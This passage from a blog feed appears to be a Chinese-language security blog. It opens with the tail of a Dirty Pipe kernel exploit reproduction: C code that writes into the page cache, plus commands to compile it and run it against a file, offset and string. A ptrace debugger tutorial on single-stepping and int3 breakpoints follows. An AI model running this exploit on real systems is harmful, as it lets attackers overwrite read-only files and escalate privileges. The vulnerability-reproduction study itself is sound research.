but</span></span><br><span class="line"><span class="comment">   will instead write into the page cache, because of the</span></span><br><span class="line"><span class="comment">   PIPE_BUF_FLAG_CAN_MERGE flag */</span></span><br><span class="line">nbytes = write(p[<span class="number">1</span>], data, data_size);</span><br><span class="line"><span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;write failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ((<span class="type">size_t</span>)nbytes &lt; data_size) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;short write\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;It worked!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc exp.c -o exp --static</span><br><span class="line">./exp file offset string</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;basic&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#basic&quot;&gt;#&lt;/a&gt; basic&lt;/h1&gt;
&lt;p&gt;(之后会把 docker 做好传上去 以后就不用折腾了 QAQ)&lt;br&gt;
&lt;a href=&quot;https://hub.dock</summary>
      
    
    
    
    <category term="CVE recur" scheme="https://squirre17.github.io/categories/CVE-recur/"/>
    
    
    <category term="Kernel" scheme="https://squirre17.github.io/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>debugger-impl</title>
    <link href="https://squirre17.github.io/2022/10/30/debugger-impl/"/>
    <id>https://squirre17.github.io/2022/10/30/debugger-impl/</id>
    <published>2022-10-30T06:46:09.000Z</published>
    <updated>2022-10-30T06:50:02.846Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://eli.thegreenplace.net/2011/01/23/how-debuggers-work-part-1/">How debuggers work: Part 1 - Basics - Eli Bendersky’s website</a><br> 单纯的复现此文章。</p><h1 id="single-step"><a class="markdownIt-Anchor" href="#single-step">#</a> single step</h1><p>首先是 ptrace</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">ptrace</span><span class="params">(<span class="keyword">enum</span> __ptrace_request request, <span class="type">pid_t</span> pid,</span></span><br><span class="line"><span class="params">                 <span class="type">void</span> *addr, <span class="type">void</span> *data)</span>;</span><br></pre></td></tr></table></figure><p>对于第一个 request 的参数</p><ul><li><code>PTRACE_TRACEME</code>  request, which means that this child process asks the OS kernel to let its parent trace it.</li><li>这个参数只用于子进程，所以这里是在 fork 之后</li></ul><p>第三个对地址进行和第四个是地址操作相关，根据 request 的类型，是对这个 addr 进行 poke，或者 peek 这个数据到 data 里（或者直接 peek 到返回值）。</p><blockquote><p>Indicates that this process is to be traced by its parent. Any signal (except SIGKILL) delivered to this process will cause it to stop and its parent to be notified via wait(). <strong>Also, all subsequent calls to exec() by this process will cause a SIGTRAP to be sent to it, giving the parent a chance to gain control before the new program begins execution</strong>. A process probably shouldn’t make this request if its parent isn’t expecting to trace it. (pid, addr, and data are ignored.)</p></blockquote><p>wait () 函数等待子进程终止，并设置相应的状态码。（不过这里貌似不是终止，而是 STOP）感觉是英文的 terminate 包括 stop、<br>WIFSTOPPED (sstatus) 判读是不是被信号传递而停止</p><blockquote><pre><code>   WIFSTOPPED(wstatus)</code></pre></blockquote><pre><code>          returns true if the child process was stopped by delivery of a signal; this is possible only if the call was done using WUNTRACED or          when the child is being traced (see ptrace(2)).</code></pre><p>子进程利用 <code>(ptrace(PTRACE_TRACEME, 0, 0, 0)</code>  向 OS 发送请求要求父进程 watch 自己，然后 execl 的时候发送 SIGTRAP 给父进程。<br>然后父进程里就不断发送单步信号和 wait 等待。<br>父进程中循环结束的条件是子进程发送 exit 的信号，WIFEXITED。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;unistd.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sys/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> procmsg(s...) printf(s)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TODO do &#123;\</span></span><br><span class="line"><span class="meta">    printf(<span class="string">&quot;TODO: %s\n&quot;</span>, __FUNCTION__); \</span></span><br><span class="line"><span class="meta">    exit(1); \</span></span><br><span class="line"><span class="meta">&#125; while (0);</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">run_target</span><span class="params">(<span class="type">char</span> * programname)</span>&#123;</span><br><span class="line">    procmsg(<span class="string">&quot;target started. will run &#x27;%s&#x27;\n&quot;</span>, programname);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allow tracing of this process */</span></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Replace this process&#x27;s image with the given program */</span></span><br><span class="line">    execl(programname, programname, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">run_debugger</span><span class="params">(<span class="type">pid_t</span> child_pid)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> wait_status;</span><br><span class="line">    <span class="type">unsigned</span> icounter = <span class="number">0</span>;</span><br><span class="line">    procmsg(<span class="string">&quot;debugger started\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wait for child to stop on its first instruction after execl */</span></span><br><span class="line">    wait(&amp;wait_status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (WIFSTOPPED(wait_status)) &#123;</span><br><span class="line">        icounter++;</span><br><span class="line">        <span class="comment">/* Make the child execute another instruction */</span></span><br><span class="line">        <span class="keyword">if</span> (ptrace(PTRACE_SINGLESTEP, child_pid, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Wait for child to stop on its next instruction */</span></span><br><span class="line">        wait(&amp;wait_status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    procmsg(<span class="string">&quot;the child executed %u instructions\n&quot;</span>, icounter);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Expected a program name as argument\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)     <span class="comment">/* child process */</span></span><br><span class="line">        run_target(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) <span class="comment">/* parent process */</span></span><br><span class="line">        run_debugger(pid);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于它监听的 victim</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    mov rdi, <span class="number">1</span></span><br><span class="line">    lea rsi, .msg[rip]</span><br><span class="line">    mov rdx, <span class="number">20</span></span><br><span class="line">    mov rax, <span class="number">1</span>    <span class="comment">// sys_write callno</span></span><br><span class="line">    syscall      </span><br><span class="line"></span><br><span class="line">    mov rax, <span class="number">60</span></span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">.section .data</span><br><span class="line">.msg:</span><br><span class="line">    .<span class="built_in">string</span> <span class="string">&quot;hello debugger\n\0&quot;</span> </span><br><span class="line"><span class="comment">// as -o victim.o -s victim.S</span></span><br><span class="line"><span class="comment">// ld -o victim victim.o</span></span><br></pre></td></tr></table></figure><p>然后引入一个 <code>sys/user.h</code>  的 header 用于调试。</p><blockquote><p>/* The whole purpose of this file is for GDB and GDB only.<br>Don’t read too much into it. Don’t use it for<br>anything other than GDB unless know what you are<br>doing.  */</p></blockquote><p>用 <code>PTRACE_PEEKTEXT</code>  进行指定地址的内存获取</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">run_debugger</span><span class="params">(<span class="type">pid_t</span> child_pid)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> wait_status;</span><br><span class="line">    <span class="type">unsigned</span> icounter = <span class="number">0</span>;</span><br><span class="line">    pntmsg(<span class="string">&quot;debugger started\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Wait for child to stop on its first instruction after execl */</span></span><br><span class="line">    wait(&amp;wait_status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (WIFSTOPPED(wait_status)) &#123;</span><br><span class="line">        icounter++;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line"></span><br><span class="line">        ptrace(PTRACE_GETREGS, child_pid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">        <span class="type">unsigned</span> instr = ptrace(PTRACE_PEEKTEXT, child_pid, regs.rip, <span class="number">0</span>);</span><br><span class="line">        pntmsg(<span class="string">&quot;icounter = %u, instr = 0x%08x, rip = 0x%08x, rax = 0x%08x\n&quot;</span>,</span><br><span class="line">            icounter, instr, regs.rip, regs.rax</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">/* Make the child execute another instruction */</span></span><br><span class="line">        Ptrace(PTRACE_SINGLESTEP, child_pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Wait for child to stop on its next instruction */</span></span><br><span class="line">        wait(&amp;wait_status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pntmsg(<span class="string">&quot;the child executed %u instructions\n&quot;</span>, icounter);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一次返回值是 4 字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[PNT] debugger started</span><br><span class="line">[CHD] target started. will run &#x27;./victim&#x27;</span><br><span class="line">[PNT] icounter = 1, instr = 0x01c7c748, rip = 0x00401000, rax = 0x00000000</span><br><span class="line">[PNT] icounter = 2, instr = 0xf2358d48, rip = 0x00401007, rax = 0x00000000</span><br><span class="line">[PNT] icounter = 3, instr = 0x14c2c748, rip = 0x0040100e, rax = 0x00000000</span><br><span class="line">[PNT] icounter = 4, instr = 0x01c0c748, rip = 0x00401015, rax = 0x00000000</span><br><span class="line">[PNT] icounter = 5, instr = 0xc748050f, rip = 0x0040101c, rax = 0x00000001</span><br><span class="line">hello debugger</span><br><span class="line">[PNT] icounter = 6, instr = 0x3cc0c748, rip = 0x0040101e, rax = 0x00000014</span><br><span class="line">[PNT] icounter = 7, instr = 0x0000050f, rip = 0x00401025, rax = 0x0000003c</span><br><span class="line">[PNT] the child executed 7 instructions</span><br></pre></td></tr></table></figure><h1 id="breakpoint"><a class="markdownIt-Anchor" href="#breakpoint">#</a> breakpoint</h1><p>中断分为软中断和硬中断.<br> 硬中断有专门的电器设备去处理。<br>对于一条指令，debugger 会把它的首指令替换为 <code>int 3</code> (0xcc).</p><p>objdump 出指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">objdump -d victim</span>      </span><br><span class="line"></span><br><span class="line">victim:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000401000 &lt;_start&gt;:</span><br><span class="line">  401000:       48 c7 c7 01 00 00 00    mov    $0x1,%rdi</span><br><span class="line">  401007:       48 8d 35 f2 0f 00 00    lea    0xff2(%rip),%rsi        # 402000 &lt;.msg&gt;</span><br><span class="line">  40100e:       48 c7 c2 14 00 00 00    mov    $0x14,%rdx</span><br><span class="line">  401015:       48 c7 c0 01 00 00 00    mov    $0x1,%rax</span><br><span class="line">  40101c:       0f 05                   syscall </span><br><span class="line">  40101e:       48 c7 c0 3c 00 00 00    mov    $0x3c,%rax</span><br><span class="line">  401025:       0f 05                   syscall </span><br></pre></td></tr></table></figure><p>获取第一条指令地址 <code>401000</code></p><p>在这条地址上取出指令 设置为 0xcc 然后写回</p><ul><li>PTRACE_CONT  : Restart  the stopped tracee process.</li><li>PTRACE_POKETEXT, PTRACE_POKEDATA 这两个是 equivalent 的</li><li>strsignal 一定要包含头文件 string.h 否则会引用到内核头文件中去。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Ptrace(PTRACE_GETREGS, child_pid, <span class="number">0</span>, &amp;regs);</span><br><span class="line"><span class="type">unsigned</span> instr = Ptrace(PTRACE_PEEKTEXT, child_pid,(<span class="type">void</span> *)addr,(<span class="type">void</span> *)<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* modify instruction in addr 0x401000 to 0xcc */</span></span><br><span class="line"><span class="type">unsigned</span> trap_instr = (instr &amp; <span class="number">0xffffff00</span>) | <span class="number">0xcc</span>;</span><br><span class="line">Ptrace(PTRACE_POKETEXT, child_pid, (<span class="type">void</span> *)addr, trap_instr);</span><br><span class="line"><span class="type">unsigned</span> readback = Ptrace(PTRACE_PEEKTEXT, child_pid,(<span class="type">void</span> *)addr,(<span class="type">void</span> *)<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">pntmsg(<span class="string">&quot;instruction 0x%08x in addr 0x%08x\n&quot;</span>, readback, addr);</span><br><span class="line"><span class="comment">// pause();</span></span><br><span class="line"></span><br><span class="line">Ptrace(PTRACE_CONT, child_pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">wait(&amp;wait_status);</span><br><span class="line"><span class="keyword">if</span> (WIFSTOPPED(wait_status)) &#123;</span><br><span class="line">    pntmsg(<span class="string">&quot;Child got a signal: %s\n&quot;</span>, strsignal(WSTOPSIG(wait_status)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    perror(<span class="string">&quot;wait&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* See where the child is now */</span></span><br><span class="line">Ptrace(PTRACE_GETREGS, child_pid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">pntmsg(<span class="string">&quot;Child stopped at RIP = 0x%08x\n&quot;</span>, regs.rip);</span><br><span class="line">pause();</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[PNT] debugger started</span><br><span class="line">[CHD] target started. will run &#x27;./victim&#x27;</span><br><span class="line">[PNT] instruction 0x01c7c7cc in addr 0x00401000</span><br><span class="line">[PNT] Child got a signal: Trace/breakpoint trap</span><br><span class="line">[PNT] Child stopped at RIP = 0x00401001</span><br></pre></td></tr></table></figure><p>可以看到 rip 移动了一位，需要移动回去，然后覆写这原来的位置，就能继续运行了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">regs.rip -= <span class="number">1</span>;</span><br><span class="line">Ptrace(PTRACE_SETREGS, child_pid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">Ptrace(PTRACE_POKETEXT, child_pid, regs.rip, instr);</span><br><span class="line">pntmsg(<span class="string">&quot;icounter = %u, instr = 0x%08x, rip = 0x%08x\n&quot;</span>,</span><br><span class="line">    icounter, instr, regs.rip</span><br><span class="line">);</span><br><span class="line"><span class="comment">// pause();</span></span><br><span class="line"><span class="comment">/* Make the child execute another instruction */</span></span><br><span class="line">Ptrace(PTRACE_SINGLESTEP, child_pid, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">pause();</span><br><span class="line"><span class="comment">/* Wait for child to stop on its next instruction */</span></span><br><span class="line">wait(&amp;wait_status);</span><br></pre></td></tr></table></figure><p>另外 这个提取 rip 然后加减写的操作可以被封装好</p><ul><li>create_breakpoint</li><li>resume_from_breakpoint<br> 对于 ptrace 很坑的一点在于，有的时候返回值为负数不正常，有的时候却正常。需要区别对待<br>现在写一个新的 victim 实例</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">do_stuff</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i)</span><br><span class="line">        do_stuff();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -o victim victim.c -no-pie</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0000000000401156 &lt;do_stuff&gt;:</span><br><span class="line">  401156:       f3 0f 1e fa             endbr64 </span><br><span class="line">  40115a:       55                      push   %rbp</span><br><span class="line">  40115b:       48 89 e5                mov    %rsp,%rbp</span><br><span class="line">  40115e:       48 8d 3d 9f 0e 00 00    lea    0xe9f(%rip),%rdi        # 402004 &lt;_IO_stdin_used+0x4&gt;</span><br><span class="line">  401165:       b8 00 00 00 00          mov    $0x0,%eax</span><br><span class="line">  40116a:       e8 f1 fe ff ff          callq  401060 &lt;printf@plt&gt;</span><br><span class="line">  40116f:       90                      nop</span><br><span class="line">  401170:       5d                      pop    %rbp</span><br><span class="line">  401171:       c3                      retq</span><br></pre></td></tr></table></figure><p>如果要命中一个断点多次，就是先清除这个断点，然后让它回滚，再单步，再写回这个断点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    1. get regs</span></span><br><span class="line"><span class="comment">    2. rollback rip and write back</span></span><br><span class="line"><span class="comment">    3. single step</span></span><br><span class="line"><span class="comment">    4. re-enable breakpoint</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">resume_from_breakpoint</span><span class="params">(<span class="type">pid_t</span> pid, debug_breakpoint* dbp)</span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_regs_struct</span> <span class="title">regs</span>;</span></span><br><span class="line">    <span class="type">int</span> wait_status;</span><br><span class="line"></span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[DBG] 0x%08x 0x%08x\n&quot;</span>, dbp-&gt;addr, regs.rip);</span><br><span class="line">    assert(dbp-&gt;addr + <span class="number">1</span> == regs.rip);</span><br><span class="line"></span><br><span class="line">    regs.rip -= <span class="number">1</span>;</span><br><span class="line">    ptrace(PTRACE_SETREGS, pid, <span class="number">0</span>, &amp;regs);</span><br><span class="line">    disable_breakpoint(pid, dbp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[DBG] before single step %p\n&quot;</span>, get_child_rip(pid));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_SINGLESTEP, pid, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wait(&amp;wait_status);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[DBG] %s at (%s:%u)\n&quot;</span>, strsignal(WSTOPSIG(wait_status)), __FILE__, __LINE__);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (WIFEXITED(wait_status)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    enable_breakpoint(pid, dbp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ptrace(PTRACE_CONT, pid, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ptrace&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    wait(&amp;wait_status);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(WIFEXITED(wait_status)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (WIFSTOPPED(wait_status)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    pntmsg(<span class="string">&quot;child stopped at breakpoint. RIP = %p\n&quot;</span>, get_child_rip(child_pid));</span><br><span class="line">    pntmsg(<span class="string">&quot;resuming\n&quot;</span>);</span><br><span class="line">    